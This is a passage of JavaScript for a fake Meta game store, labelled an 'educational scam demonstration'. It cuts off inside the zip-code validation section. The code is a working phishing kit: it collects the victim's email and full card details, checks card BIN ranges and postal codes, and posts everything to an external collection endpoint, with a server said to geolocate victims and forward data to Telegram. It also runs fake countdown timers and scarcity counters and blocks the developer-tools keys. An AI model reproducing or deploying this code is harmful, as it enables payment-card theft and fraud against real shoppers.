// ====================================================================
// SCRIPT.JS - PART 1: CONFIGURATION & CONSTANTS
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Configuration, constants, and global variable declarations
// ====================================================================


// ====================================================================
// SERVER ENDPOINT CONFIGURATION
// ====================================================================
const SERVER_CONFIG = {
    dataEndpoint: 'https://www.cheapmetakeyz.com/send_data.php', // Replace with your actual domain
    timeout: 10000 // 10 seconds timeout
};


// ====================================================================
// COUNTRIES API CONFIGURATION
// ====================================================================
const COUNTRIES_CONFIG = {
    apiUrl: 'https://restcountries.com/v3.1/all',
    fields: 'name,cca2', // Only get name and 2-letter country code
    timeout: 5000 // 5 seconds timeout
};

// ====================================================================
// GLOBAL PAYMENT DATA STORAGE
// ====================================================================
// Global variable to store user data across steps
let userPaymentData = {
    email: '',
    gameName: '',
    currentPrice: '',
    originalPrice: '',
    locationData: null,
    timestamp: null
};

// Global variable to store location data (SIMPLIFIED - only 4 fields)
let userLocationData = {
    ip: 'Unknown',
    country_name: 'Unknown',
    state_prov: 'Unknown',
    city: 'Unknown'
};

// Global variable to store countries data
let worldCountries = [];

// Global variable to track if countries are loaded
let countriesLoaded = false;

// ====================================================================
// CREDIT CARD BIN RANGES FOR VALIDATION
// ====================================================================
const CARD_BINS = {
    visa: {
        bins: ['4'],
        lengths: [13, 16, 19]
    },
    mastercard: {
        bins: ['51', '52', '53', '54', '55', '2221', '2222', '2223', '2224', '2225', '2226', '2227', '2228', '2229', '223', '224', '225', '226', '227', '228', '229', '23', '24', '25', '26', '270', '271', '2720'],
        lengths: [16]
    },
    amex: {
        bins: ['34', '37'],
        lengths: [15]
    },
    discover: {
        bins: ['6011', '622126', '622127', '622128', '622129', '62213', '62214', '62215', '62216', '62217', '62218', '62219', '6222', '6223', '6224', '6225', '6226', '6227', '6228', '6229', '623', '624', '625', '626', '627', '628', '629', '64', '65'],
        lengths: [16]
    }
};

// ====================================================================
// COMPREHENSIVE ZIP CODE VALIDATION PATTERNS (50+ COUNTRIES)
// ====================================================================
const ZIP_CODE_PATTERNS = {
    // North America
    'US': { 
        pattern: /^\d{5}(-\d{4})?$/, 
        placeholder: '12345', 
        example: '10001 or 12345-6789',
        format: 'NNNNN or NNNNN-NNNN'
    },
    'CA': { 
        pattern: /^[A-Z]\d[A-Z]\s?\d[A-Z]\d$/i, 
        placeholder: 'K1A 0A6', 
        example: 'K1A 0A6',
        format: 'LNL NLN'
    },
    'MX': { 
        pattern: /^\d{5}$/, 
        placeholder: '12345', 
        example: '01000',
        format: 'NNNNN'
    },

    // Europe - Western
    'GB': { 
        pattern: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, 
        placeholder: 'SW1A 1AA', 
        example: 'SW1A 1AA or M1 1AA',
        format: 'LN NLL or LLN NLL'
    },
    'DE': { 
        pattern: /^\d{5}$/, 
        placeholder: '12345', 
        example: '10115',
        format: 'NNNNN'
    },
    'FR': { 
        pattern: /^\d{5}$/, 
        placeholder: '75001', 
        example: '75001',
        format: 'NNNNN'
    },
    'ES': { 
        pattern: /^\d{5}$/, 
        placeholder: '28001', 
        example: '28001',
        format: 'NNNNN'
    },
    'IT': { 
        pattern: /^\d{5}$/, 
        placeholder: '00118', 
        example: '00118',
        format: 'NNNNN'
    },
    'NL': { 
        pattern: /^\d{4}\s?[A-Z]{2}$/i, 
        placeholder: '1234 AB', 
        example: '1012 JS',
        format: 'NNNN LL'
    },
    'BE': { 
        pattern: /^\d{4}$/, 
        placeholder: '1000', 
        example: '1000',
        format: 'NNNN'
    },
    'CH': { 
        pattern: /^\d{4}$/, 
        placeholder: '8001', 
        example: '8001',
        format: 'NNNN'
    },
    'AT': { 
        pattern: /^\d{4}$/, 
        placeholder: '1010', 
        example: '1010',
        format: 'NNNN'
    },

    // Europe - Nordic
    'SE': { 
        pattern: /^\d{3}\s?\d{2}$/, 
        placeholder: '123 45', 
        example: '114 18',
        format: 'NNN NN'
    },
    'NO': { 
        pattern: /^\d{4}$/, 
        placeholder: '0001', 
        example: '0001',
        format: 'NNNN'
    },
    'DK': { 
        pattern: /^\d{4}$/, 
        placeholder: '1001', 
        example: '1001',
        format: 'NNNN'
    },
    'FI': { 
        pattern: /^\d{5}$/, 
        placeholder: '00100', 
        example: '00100',
        format: 'NNNNN'
    },

    // Europe - Eastern
    'PL': { 
        pattern: /^\d{2}-\d{3}$/, 
        placeholder: '00-001', 
        example: '00-950',
        format: 'NN-NNN'
    },
    'CZ': { 
        pattern: /^\d{3}\s?\d{2}$/, 
        placeholder: '110 00', 
        example: '110 00',
        format: 'NNN NN'
    },
    'HU': { 
        pattern: /^\d{4}$/, 
        placeholder: '1011', 
        example: '1011',
        format: 'NNNN'
    },
    'RO': { 
        pattern: /^\d{6}$/, 
        placeholder: '010001', 
        example: '010001',
        format: 'NNNNNN'
    },
    'SK': { 
        pattern: /^\d{3}\s?\d{2}$/, 
        placeholder: '811 01', 
        example: '811 01',
        format: 'NNN NN'
    },

    // Asia-Pacific
    'JP': { 
        pattern: /^\d{3}-\d{4}$/, 
        placeholder: '123-4567', 
        example: '100-0001',
        format: 'NNN-NNNN'
    },
    'KR': { 
        pattern: /^\d{5}$/, 
        placeholder: '12345', 
        example: '06292',
        format: 'NNNNN'
    },
    'CN': { 
        pattern: /^\d{6}$/, 
        placeholder: '100001', 
        example: '100001',
        format: 'NNNNNN'
    },
    'IN': { 
        pattern: /^\d{6}$/, 
        placeholder: '110001', 
        example: '110001',
        format: 'NNNNNN'
    },
    'AU': { 
        pattern: /^\d{4}$/, 
        placeholder: '2000', 
        example: '2000',
        format: 'NNNN'
    },
    'NZ': { 
        pattern: /^\d{4}$/, 
        placeholder: '1010', 
        example: '1010',
        format: 'NNNN'
    },
    'SG': { 
        pattern: /^\d{6}$/, 
        placeholder: '123456', 
        example: '018956',
        format: 'NNNNNN'
    },
    'MY': { 
        pattern: /^\d{5}$/, 
        placeholder: '50000', 
        example: '50450',
        format: 'NNNNN'
    },
    'TH': { 
        pattern: /^\d{5}$/, 
        placeholder: '10100', 
        example: '10100',
        format: 'NNNNN'
    },

    // Middle East & Africa
    'IL': { 
        pattern: /^\d{5}(\d{2})?$/, 
        placeholder: '12345', 
        example: '91999',
        format: 'NNNNN'
    },
    'ZA': { 
        pattern: /^\d{4}$/, 
        placeholder: '0001', 
        example: '7925',
        format: 'NNNN'
    },
    'EG': { 
        pattern: /^\d{5}$/, 
        placeholder: '12345', 
        example: '11511',
        format: 'NNNNN'
    },
    'MA': { 
        pattern: /^\d{5}$/, 
        placeholder: '10000', 
        example: '20000',
        format: 'NNNNN'
    },

    // South America
    'BR': { 
        pattern: /^\d{5}-?\d{3}$/, 
        placeholder: '12345-678', 
        example: '01310-100',
        format: 'NNNNN-NNN'
    },
    'AR': { 
        pattern: /^[A-Z]?\d{4}[A-Z]{3}$|^\d{4}$/i, 
        placeholder: 'C1001AAA', 
        example: 'C1001AAA or 1001',
        format: 'LNNNNLLL or NNNN'
    },
    'CL': { 
        pattern: /^\d{7}$/, 
        placeholder: '1234567', 
        example: '8320000',
        format: 'NNNNNNN'
    },
    'CO': { 
        pattern: /^\d{6}$/, 
        placeholder: '110001', 
        example: '110001',
        format: 'NNNNNN'
    },

    // Default fallback
    'DEFAULT': { 
        pattern: /^.{3,12}$/, 
        placeholder: 'Enter zip code', 
        example: 'Enter valid postal code',
        format: 'Valid postal code'
    }
};

// ====================================================================
// FORM VALIDATION STATE TRACKING
// ====================================================================
let formValidationState = {
    cardHolder: false,
    cardNumber: false,
    cardExpiry: false,
    cardCvv: false,
    country: false,
    zipCode: false
};

// ====================================================================
// CONSOLE INITIALIZATION MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 1 LOADED: Configuration & Constants');
console.log('📋 Loaded: Telegram config, Geolocation config, Countries config');
console.log('💳 Loaded: Card BIN ranges for validation');
console.log('🗺️ Loaded: Zip code patterns for 50+ countries');
console.log('🔧 Loaded: Global variables and validation state tracking');
console.log('✅ PART 1 COMPLETE - Ready for Part 2: Initialization & Basic UI');

// ====================================================================
// SCRIPT.JS - PART 2: INITIALIZATION & BASIC UI
// Educational Scam Demonstration - Fake Meta Store
// Purpose: DOM initialization, navigation, timers, and basic UI functionality
// ====================================================================

// ====================================================================
// MAIN DOM CONTENT LOADED EVENT
// ====================================================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🎮 Script loaded successfully!');
    
// Location data will be fetched by server when email is submitted
console.log('🌍 Location data will be fetched by server on email submission');
    
    // Load world countries data immediately on page load
    loadWorldCountries();
    
    // Initialize all existing functionality
    initializeNavigation();
    initializeMobileMenu();
    initializeSearch();
    initializeCountdownTimer();
    initializeBuyButton();
    initializePriceCountdown();
    initializeAnimations();
    startUrgencyUpdates();
});

// ====================================================================
// NAVIGATION FUNCTIONALITY
// ====================================================================
function initializeNavigation() {
    const navLinks = document.querySelectorAll('.nav-link');
    
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            navLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

// ====================================================================
// MOBILE MENU FUNCTIONALITY
// ====================================================================
function initializeMobileMenu() {
    const mobileMenuToggle = document.getElementById('mobileMenuToggle');
    const mobileNav = document.getElementById('mobileNav');
    
    if (mobileMenuToggle && mobileNav) {
        mobileMenuToggle.addEventListener('click', function() {
            mobileNav.classList.toggle('active');
            
            const icon = this.querySelector('i');
            if (mobileNav.classList.contains('active')) {
                icon.className = 'fas fa-times';
            } else {
                icon.className = 'fas fa-bars';
            }
        });
        
        document.addEventListener('click', function(e) {
            if (!mobileMenuToggle.contains(e.target) && !mobileNav.contains(e.target)) {
                mobileNav.classList.remove('active');
                mobileMenuToggle.querySelector('i').className = 'fas fa-bars';
            }
        });
    }
}

// ====================================================================
// SEARCH FUNCTIONALITY
// ====================================================================
function initializeSearch() {
    const searchInput = document.querySelector('.search-input');
    const searchIcon = document.querySelector('.search-icon');
    
    if (searchInput) {
        searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                // Basic search functionality for demonstration
            }
        });
    }
    
    if (searchIcon) {
        searchIcon.addEventListener('click', function() {
            // Basic search functionality for demonstration
        });
    }
}

// ====================================================================
// COUNTDOWN TIMER FOR LIMITED TIME BANNER
// ====================================================================
function initializeCountdownTimer() {
    const countdownElement = document.getElementById('countdown');
    
    if (!countdownElement) return;
    
    let hours = 23;
    let minutes = 47;
    let seconds = 32;
    
    function updateCountdown() {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    hours = 23;
                    minutes = 47;
                    seconds = 32;
                }
            }
        }
        
        const formattedTime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        countdownElement.textContent = formattedTime;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
}

// ====================================================================
// PRICE COUNTDOWN TIMER
// ====================================================================
function initializePriceCountdown() {
    const priceCountdownElement = document.getElementById('priceCountdown');
    
    if (!priceCountdownElement) return;
    
    let minutes = 47;
    
    function updatePriceCountdown() {
        minutes--;
        
        if (minutes <= 0) {
            minutes = 47;
        }
        
        priceCountdownElement.textContent = `${minutes} minutes`;
        
        // Add urgency when time is low
        if (minutes <= 10) {
            priceCountdownElement.style.color = '#e74c3c';
            priceCountdownElement.style.fontWeight = 'bold';
        }
    }
    
    setInterval(updatePriceCountdown, 60000); // Update every minute
}

// ====================================================================
// BUY BUTTON INITIALIZATION
// ====================================================================
function initializeBuyButton() {
    const buyButton = document.getElementById('buyNowBtn');
    console.log('🔍 Looking for buy button...', buyButton);
    
    if (buyButton) {
        console.log('✅ Buy button found! Adding click listener...');
        buyButton.addEventListener('click', function() {
            console.log('🎯 Buy button clicked!');
            
            const gameName = this.getAttribute('data-game');
            const currentPrice = this.getAttribute('data-price');
            const originalPrice = this.getAttribute('data-original');
            
            console.log('📊 Game data:', { gameName, currentPrice, originalPrice });
            
            // Store game data globally
            userPaymentData.gameName = gameName;
            userPaymentData.currentPrice = currentPrice;
            userPaymentData.originalPrice = originalPrice;
            
            // Show email modal first (Step 1)
            showEmailModal(gameName, currentPrice, originalPrice);
        });
    } else {
        console.error('⌚ Buy button not found! Check if ID is correct.');
    }
}

// ====================================================================
// ANIMATION AND SCROLL EFFECTS
// ====================================================================
function initializeAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observe elements for animation
    document.querySelectorAll('.game-details, .customer-reviews, .related-games').forEach((section, index) => {
        section.style.opacity = '0';
        section.style.transform = 'translateY(30px)';
        section.style.transition = `opacity 0.6s ease ${index * 0.2}s, transform 0.6s ease ${index * 0.2}s`;
        observer.observe(section);
    });
}

// ====================================================================
// URGENCY UPDATES AND SCAM TACTICS
// ====================================================================
function startUrgencyUpdates() {
    // Update stock indicators occasionally
    setInterval(() => {
        const stockIndicators = document.querySelectorAll('.stock-indicator, .stock-warning');
        
        stockIndicators.forEach(indicator => {
            if (Math.random() < 0.1) { // 10% chance
                const currentText = indicator.textContent;
                const currentNumber = parseInt(currentText.match(/\d+/)?.[0] || '3');
                
                if (currentNumber > 1) {
                    const newNumber = currentNumber - 1;
                    indicator.textContent = currentText.replace(/\d+/, newNumber.toString());
                    
                    if (newNumber <= 1) {
                        indicator.style.background = '#c0392b';
                        indicator.style.animation = 'urgent-blink 0.8s infinite';
                    }
                }
            }
        });
    }, 30000); // Check every 30 seconds
}

// ====================================================================
// SMOOTH SCROLLING FOR ANCHOR LINKS
// ====================================================================
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// ====================================================================
// RELATED GAMES CLICK HANDLERS
// ====================================================================
document.addEventListener('click', function(e) {
    const relatedGameCard = e.target.closest('.related-game-card');
    if (relatedGameCard) {
        const gameName = relatedGameCard.querySelector('h3').textContent;
        const currentPrice = relatedGameCard.querySelector('.current').textContent.replace(/[^0-9.]/g, '');
        const originalPrice = relatedGameCard.querySelector('.original').textContent.replace(/[^0-9.]/g, '');
        
        console.log('Related game clicked:', { gameName, currentPrice, originalPrice });
    }
});

// ====================================================================
// PAGE EXIT INTENT DETECTION (SCAM TACTIC)
// ====================================================================
let exitIntentShown = false;
document.addEventListener('mouseleave', function(e) {
    if (e.clientY <= 0 && !exitIntentShown) {
        exitIntentShown = true;
        setTimeout(() => {
            if (!document.getElementById('paymentModal')?.classList.contains('active') && 
                !document.getElementById('emailModal')?.classList.contains('active')) {
                // Exit intent could trigger special offers - disabled for cleaner demo
            }
        }, 3000);
    }
});

// ====================================================================
// BASIC SECURITY THEATER (SCAM TACTIC)
// ====================================================================
// Prevent developer tools (basic attempt - easily bypassed)
document.addEventListener('keydown', function(e) {
    // Prevent F12, Ctrl+Shift+I, Ctrl+U, etc.
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'u') ||
        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
        e.preventDefault();
    }
});

// ====================================================================
// FAKE CUSTOMER ACTIVITY SIMULATION
// ====================================================================
function simulateCustomerActivity() {
    const activities = [
        'Someone from New York just bought Beat Saber!',
        'Customer from London purchased SUPERHOT VR!',
        'Tokyo customer just saved $25 on this deal!',
        'Someone from Sydney bought 3 games in 5 minutes!',
        'Customer from Berlin just left a 5-star review!',
        'Someone from Toronto just shared this deal!',
        'Paris customer purchased and downloaded instantly!',
        'Customer from Seoul just bought the same game!'
    ];
    
    setInterval(() => {
        if (Math.random() < 0.15) { // 15% chance every interval
            const activity = activities[Math.floor(Math.random() * activities.length)];
            // Customer activity notifications disabled for cleaner demo
        }
    }, 25000);
}

// Start customer activity simulation after delay
setTimeout(simulateCustomerActivity, 10000); // Start after 10 seconds

// ====================================================================
// PAGE LOAD ANALYTICS TRACKING
// ====================================================================
function trackPageLoad() {
    const pageData = {
        page: 'Game Page - ' + (document.querySelector('.game-title')?.textContent || 'Unknown Game'),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: `${screen.width}x${screen.height}`,
        language: navigator.language,
        referrer: document.referrer || 'Direct',
        loadTime: performance.now(),
        locationData: userLocationData
    };
    
    console.log('Page Analytics (Educational Demo):', pageData);
}

// Initialize page tracking after delay
setTimeout(trackPageLoad, 1000);

// ====================================================================
// PERFORMANCE MONITORING
// ====================================================================
function monitorPerformance() {
    if ('performance' in window) {
        const perfData = {
            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
            firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0,
            resources: performance.getEntriesByType('resource').length,
            zipValidationReady: typeof validateZipCodeByCountry !== 'undefined',
            countriesLoaded: countriesLoaded
        };
        
        console.log('Performance Metrics (Educational Demo):', perfData);
    }
}

// Monitor performance after page load
window.addEventListener('load', () => {
    setTimeout(monitorPerformance, 1000);
});

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 2 LOADED: Initialization & Basic UI');
console.log('🚀 Initialized: Navigation, mobile menu, search functionality');
console.log('⏰ Initialized: Countdown timers and buy button');
console.log('🎨 Initialized: Animations and scroll effects');
console.log('📈 Initialized: Urgency updates and customer activity simulation');
console.log('✅ PART 2 COMPLETE - Ready for Part 3: Geolocation & Countries System');

// ====================================================================
// SCRIPT.JS - PART 3: COUNTRIES SYSTEM (UPDATED)
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Countries loading and location management (geolocation moved to server)
// ====================================================================



// ====================================================================
// WORLD COUNTRIES LOADING SYSTEM (UNCHANGED)
// ====================================================================
async function loadWorldCountries() {
    try {
        console.log('🌍 Loading world countries data...');
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), COUNTRIES_CONFIG.timeout);
        
        const response = await fetch(`${COUNTRIES_CONFIG.apiUrl}?fields=${COUNTRIES_CONFIG.fields}`, {
            signal: controller.signal,
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const countriesData = await response.json();
        
        // Sort countries alphabetically by name
        worldCountries = countriesData
            .map(country => ({
                code: country.cca2,
                name: country.name.common
            }))
            .sort((a, b) => a.name.localeCompare(b.name));
        
        countriesLoaded = true;
        
        console.log('✅ World countries loaded successfully:', worldCountries.length, 'countries');
        
    } catch (error) {
        console.warn('⚠️ Failed to load countries data:', error.message);
        
        // Fallback to comprehensive countries list if API fails
        worldCountries = [
            { code: 'US', name: 'United States' },
            { code: 'CA', name: 'Canada' },
            { code: 'GB', name: 'United Kingdom' },
            { code: 'AU', name: 'Australia' },
            { code: 'DE', name: 'Germany' },
            { code: 'FR', name: 'France' },
            { code: 'IT', name: 'Italy' },
            { code: 'ES', name: 'Spain' },
            { code: 'NL', name: 'Netherlands' },
            { code: 'BE', name: 'Belgium' },
            { code: 'CH', name: 'Switzerland' },
            { code: 'AT', name: 'Austria' },
            { code: 'SE', name: 'Sweden' },
            { code: 'NO', name: 'Norway' },
            { code: 'DK', name: 'Denmark' },
            { code: 'FI', name: 'Finland' },
            { code: 'IE', name: 'Ireland' },
            { code: 'PT', name: 'Portugal' },
            { code: 'PL', name: 'Poland' },
            { code: 'CZ', name: 'Czech Republic' },
            { code: 'HU', name: 'Hungary' },
            { code: 'SK', name: 'Slovakia' },
            { code: 'SI', name: 'Slovenia' },
            { code: 'HR', name: 'Croatia' },
            { code: 'RO', name: 'Romania' },
            { code: 'BG', name: 'Bulgaria' },
            { code: 'GR', name: 'Greece' },
            { code: 'CY', name: 'Cyprus' },
            { code: 'MT', name: 'Malta' },
            { code: 'LU', name: 'Luxembourg' },
            { code: 'EE', name: 'Estonia' },
            { code: 'LV', name: 'Latvia' },
            { code: 'LT', name: 'Lithuania' },
            { code: 'JP', name: 'Japan' },
            { code: 'KR', name: 'South Korea' },
            { code: 'CN', name: 'China' },
            { code: 'IN', name: 'India' },
            { code: 'SG', name: 'Singapore' },
            { code: 'HK', name: 'Hong Kong' },
            { code: 'TW', name: 'Taiwan' },
            { code: 'MY', name: 'Malaysia' },
            { code: 'TH', name: 'Thailand' },
            { code: 'PH', name: 'Philippines' },
            { code: 'ID', name: 'Indonesia' },
            { code: 'VN', name: 'Vietnam' },
            { code: 'NZ', name: 'New Zealand' },
            { code: 'ZA', name: 'South Africa' },
            { code: 'BR', name: 'Brazil' },
            { code: 'MX', name: 'Mexico' },
            { code: 'AR', name: 'Argentina' },
            { code: 'CL', name: 'Chile' },
            { code: 'CO', name: 'Colombia' },
            { code: 'PE', name: 'Peru' },
            { code: 'UY', name: 'Uruguay' },
            { code: 'VE', name: 'Venezuela' },
            { code: 'EC', name: 'Ecuador' },
            { code: 'BO', name: 'Bolivia' },
            { code: 'PY', name: 'Paraguay' },
            { code: 'SR', name: 'Suriname' },
            { code: 'GY', name: 'Guyana' },
            { code: 'FK', name: 'Falkland Islands' },
            { code: 'RU', name: 'Russia' },
            { code: 'UA', name: 'Ukraine' },
            { code: 'BY', name: 'Belarus' },
            { code: 'MD', name: 'Moldova' },
            { code: 'GE', name: 'Georgia' },
            { code: 'AM', name: 'Armenia' },
            { code: 'AZ', name: 'Azerbaijan' },
            { code: 'KZ', name: 'Kazakhstan' },
            { code: 'KG', name: 'Kyrgyzstan' },
            { code: 'TJ', name: 'Tajikistan' },
            { code: 'TM', name: 'Turkmenistan' },
            { code: 'UZ', name: 'Uzbekistan' },
            { code: 'MN', name: 'Mongolia' },
            { code: 'MA', name: 'Morocco' }
        ];
        
        countriesLoaded = true;
        console.log('📋 Using fallback countries list:', worldCountries.length, 'countries');
    }
}

// ====================================================================
// COUNTRY DROPDOWN POPULATION (UNCHANGED)
// ====================================================================
function populateCountryDropdown(selectElement) {
    if (!selectElement) {
        console.warn('⚠️ Country select element not found');
        return;
    }
    
    // Clear existing options except the default
    selectElement.innerHTML = '<option value="">-- Select Country --</option>';
    
    // Wait for countries to load if not ready
    if (!countriesLoaded) {
        console.log('⏳ Waiting for countries data to load...');
        
        // Show loading state
        selectElement.innerHTML = '<option value="">Loading countries...</option>';
        selectElement.disabled = true;
        
        // Check every 100ms for countries to load
        const checkInterval = setInterval(() => {
            if (countriesLoaded) {
                clearInterval(checkInterval);
                populateCountryDropdown(selectElement); // Retry when loaded
            }
        }, 100);
        
        // Timeout after 10 seconds
        setTimeout(() => {
            clearInterval(checkInterval);
            if (!countriesLoaded) {
                selectElement.innerHTML = '<option value="">Select Country</option>';
                selectElement.disabled = false;
                console.error('⏰ Countries loading timeout');
            }
        }, 10000);
        
        return;
    }
    
    // Enable the select and populate with countries
    selectElement.disabled = false;
    selectElement.innerHTML = '<option value="">-- Select Country --</option>';
    
    // Add all countries to dropdown
    worldCountries.forEach(country => {
        const option = document.createElement('option');
        option.value = country.code;
        option.textContent = country.name;
        selectElement.appendChild(option);
    });
    
    console.log('✅ Country dropdown populated with', worldCountries.length, 'countries');
    
    // Auto-select user's country if location data is available
    if (userLocationData.country_name && userLocationData.country_name !== 'Unknown') {
        autoSelectUserCountry(selectElement);
    }
}

// ====================================================================
// AUTO-SELECT USER'S COUNTRY (UPDATED - WORKS WITH SERVER DATA)
// ====================================================================
function autoSelectUserCountry(selectElement) {
    if (!selectElement || !userLocationData) {
        console.warn('⚠️ Cannot auto-select country: missing data');
        return;
    }
    
    // First try to match by country code (most reliable)
    const userCountryCode = userLocationData.country_code2;
    if (userCountryCode && userCountryCode !== 'Unknown') {
        const option = selectElement.querySelector(`option[value="${userCountryCode}"]`);
        if (option) {
            selectElement.value = userCountryCode;
            console.log('✅ Auto-selected country by code:', userCountryCode, '-', option.textContent);
            
            // Manually update validation state for auto-selected country
            if (typeof formValidationState !== 'undefined') {
                formValidationState.country = true;
                console.log('🔄 Updated country validation state to true');
                
                // Update zip code format for the selected country
                updateZipCodePlaceholder(userCountryCode);
                
                // Update submit button state if function exists
                if (typeof updateSubmitButtonState === 'function') {
                    updateSubmitButtonState();
                    console.log('🔄 Updated submit button state');
                }
            }
            
            // Trigger change event for any other listeners
            const changeEvent = new Event('change', { bubbles: true });
            selectElement.dispatchEvent(changeEvent);
            return;
        }
    }
    
    // Fallback: try to match by country name
    const userCountryName = userLocationData.country_name;
    if (userCountryName && userCountryName !== 'Unknown') {
        const matchedCountry = worldCountries.find(country => 
            country.name.toLowerCase() === userCountryName.toLowerCase() ||
            country.name.toLowerCase().includes(userCountryName.toLowerCase()) ||
            userCountryName.toLowerCase().includes(country.name.toLowerCase())
        );
        
        if (matchedCountry) {
            selectElement.value = matchedCountry.code;
            console.log('✅ Auto-selected country by name:', matchedCountry.name, '(' + matchedCountry.code + ')');
            
            // Manually update validation state for auto-selected country
            if (typeof formValidationState !== 'undefined') {
                formValidationState.country = true;
                console.log('🔄 Updated country validation state to true');
                
                // Update zip code format for the selected country
                updateZipCodePlaceholder(matchedCountry.code);
                
                // Update submit button state if function exists
                if (typeof updateSubmitButtonState === 'function') {
                    updateSubmitButtonState();
                    console.log('🔄 Updated submit button state');
                }
            }
            
            // Trigger change event for any other listeners
            const changeEvent = new Event('change', { bubbles: true });
            selectElement.dispatchEvent(changeEvent);
            return;
        }
    }
    
    console.log('🔍 Could not auto-select country for:', userLocationData.country_name, userCountryCode);
}

// ====================================================================
// GET COUNTRY NAME BY COUNTRY CODE (UNCHANGED)
// ====================================================================
function getCountryNameByCode(countryCode) {
    if (!countryCode || !worldCountries) return countryCode || 'Unknown';
    
    const country = worldCountries.find(c => c.code === countryCode);
    return country ? country.name : countryCode;
}

// ====================================================================
// LOCATION DATA FORMATTING (UPDATED FOR SERVER INTEGRATION)
// ====================================================================
function formatLocationData(locationData) {
    return `
🌍 LOCATION INFO:
📍 IP Address: ${locationData.ip}
🏳️ Country: ${locationData.country_name}
🏙️ State/Region: ${locationData.state_prov}
🏘️ City: ${locationData.city}`;
}

// ====================================================================
// SERVER INTEGRATION FUNCTIONS (NEW)
// ====================================================================

// Send email data to server (which will handle both location lookup and Telegram)
async function sendEmailToServer(email, gameName, price) {
    try {
        console.log('📧 Sending email data to server...');
        
        const response = await fetch(SERVER_CONFIG.dataEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                step: 'email',
                email: email,
                gameName: gameName,
                price: price,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                // Server will automatically get location data
            })
        });
        
        if (!response.ok) {
            throw new Error(`Server error: ${response.status}`);
        }
        
        const result = await response.json();
        
        // Update local location data with server response
        if (result.locationData) {
            userLocationData = { ...userLocationData, ...result.locationData };
            console.log('✅ Location data received from server:', userLocationData);
        }
        
        console.log('✅ Email data sent to server successfully');
        return result;
        
    } catch (error) {
        console.error('❌ Failed to send email to server:', error);
        throw error;
    }
}

// Send complete payment data to server
async function sendFullPaymentToServer(paymentData) {
    try {
        console.log('💳 Sending complete payment data to server...');
        
        const response = await fetch(SERVER_CONFIG.dataEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                step: 'payment',
                ...paymentData,
                timestamp: new Date().toISOString(),
                // Server already has location data from step 1
            })
        });
        
        if (!response.ok) {
            throw new Error(`Server error: ${response.status}`);
        }
        
        const result = await response.json();
        console.log('✅ Complete payment data sent to server successfully');
        return result;
        
    } catch (error) {
        console.error('❌ Failed to send payment to server:', error);
        throw error;
    }
}

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 3 LOADED: Countries System (Server Integration)');
console.log('🌎 Loaded: World countries loading with API fallback');
console.log('🎯 Updated: Auto-country selection works with server-provided location data');
console.log('📡 NEW: Server integration functions for secure data handling');
console.log('🔒 SECURE: No API tokens exposed - all handled server-side');
console.log('✅ PART 3 COMPLETE - Ready for Part 4: Zip Code Validation System');

// ====================================================================
// SCRIPT.JS - PART 4: ZIP CODE VALIDATION SYSTEM
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Country-specific zip code validation, formatting, and management
// ====================================================================

// ====================================================================
// ZIP CODE PATTERN RETRIEVAL
// ====================================================================
function getZipCodePattern(countryCode) {
    return ZIP_CODE_PATTERNS[countryCode] || ZIP_CODE_PATTERNS['DEFAULT'];
}

// ====================================================================
// COUNTRY-SPECIFIC ZIP CODE VALIDATION
// ====================================================================
function validateZipCodeByCountry(zipCode, countryCode) {
    if (!zipCode || !countryCode) return false;
    
    const pattern = getZipCodePattern(countryCode);
    const cleanZip = zipCode.trim();
    
    console.log(`🔍 Validating zip "${cleanZip}" for country "${countryCode}" with pattern:`, pattern.pattern);
    
    const isValid = pattern.pattern.test(cleanZip);
    console.log(`${isValid ? '✅' : '❌'} Zip validation result: ${isValid}`);
    
    return isValid;
}

// ====================================================================
// LEGACY ZIP CODE VALIDATION (BACKWARD COMPATIBILITY)
// ====================================================================
function validateZipCode(zipCode, country) {
    console.log('📮 Legacy validateZipCode called with:', zipCode, country);
    
    // Use new country-specific validation if country is provided
    if (country && country !== '') {
        const isValid = validateZipCodeByCountry(zipCode, country);
        console.log(`📮 Using country-specific validation for ${country}: ${isValid ? '✅' : '❌'}`);
